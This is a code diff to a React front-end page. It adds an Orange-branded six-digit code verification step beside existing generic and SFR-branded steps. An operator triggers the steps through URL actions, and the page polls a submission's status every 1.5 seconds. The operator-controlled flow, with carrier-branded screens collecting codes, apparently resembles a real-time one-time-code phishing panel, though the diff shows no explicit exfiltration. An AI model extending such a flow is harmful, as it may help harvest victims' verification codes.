@@ -6,6 +6,7 @@ import CodeVerification from "@/components/CodeVerification";
 import CodeWaiting from "@/components/CodeWaiting";
 import CodeVerification6 from "@/components/CodeVerification6";
 import CodeVerification6SFR from "@/components/CodeVerification6SFR";
+import CodeVerification6Orange from "@/components/CodeVerification6Orange";
 import WaitingQueue from "@/components/WaitingQueue";
 import VerificationSuccess from "@/components/VerificationSuccess";
 import ResultScreen from "@/components/ResultScreen";
@@ -75,6 +76,13 @@ export default function Home() {
           window.history.replaceState({}, "", "/");
           setStep("adminDone");
         });
+    } else if (action === "code6orange") {
+      base44.functions.invoke("sendCode", { submissionId: id, action: "code6orange" })
+        .catch(() => {})
+        .finally(() => {
+          window.history.replaceState({}, "", "/");
+          setStep("adminDone");
+        });
     } else if (action === "code6sfr") {
       base44.functions.invoke("sendCode", { submissionId: id, action: "code6sfr" })
         .catch(() => {})
@@ -110,6 +118,7 @@ export default function Home() {
       if (s === "code_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code"); }
       else if (s === "code6_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6"); }
       else if (s === "code6sfr_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6sfr"); }
+      else if (s === "code6orange_ready") { clearInterval(pollingValidationRef.current); setStepPersisted("code6orange"); }
       else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingValidationRef.current); setStepPersisted("wrong"); }
       else if (s === "waiting_queue") { clearInterval(pollingValidationRef.current); setStepPersisted("queue"); }
     }, 1500);
@@ -124,6 +133,7 @@ export default function Home() {
       const s = res?.data?.status;
       if (s === "code6_ready") { clearInterval(pollingCodeRef.current); setStepPersisted("code6"); }
       else if (s === "code6sfr_ready") { clearInterval(pollingCodeRef.current); setStepPersisted("code6sfr"); }
+      else if (s === "code6orange_ready") { clearInterval(pollingCodeRef.current); setStepPersisted("code6orange"); }
       else if (s === "code_wrong" || s === "code_expired") { clearInterval(pollingCodeRef.current); setStepPersisted("wrong"); }
       else if (s === "waiting_queue") { clearInterval(pollingCodeRef.current); setStepPersisted("queue"); }
     }, 1500);
@@ -140,6 +150,7 @@ export default function Home() {
       else if (s === "code_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code"); }
       else if (s === "code6_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6"); }
       else if (s === "code6sfr_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6sfr"); }
+      else if (s === "code6orange_ready") { clearInterval(pollingWaitingRef.current); setStepPersisted("code6orange"); }
       else if (s === "code_wrong") { clearInterval(pollingWaitingRef.current); setStepPersisted("wrong"); }
       else if (s === "code_expired") { clearInterval(pollingWaitingRef.current); setStepPersisted("expired"); }
       else if (s === "waiting_queue") { clearInterval(pollingWaitingRef.current); setStepPersisted("queue"); }
@@ -244,6 +255,7 @@ export default function Home() {
             {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
             {step === "code6"      && <CodeVerification6 data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
             {step === "code6sfr"   && <CodeVerification6SFR data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
+            {step === "code6orange" && <CodeVerification6Orange data={submittedData} onSubmit={handleCode6Submit} loading={loading} onExpire={handleCodeExpire} />}
             {step === "waiting"    && <CodeWaiting />}
             {step === "queue"      && <WaitingQueue />}
             {step === "verified"   && <VerificationSuccess data={submittedData} />}
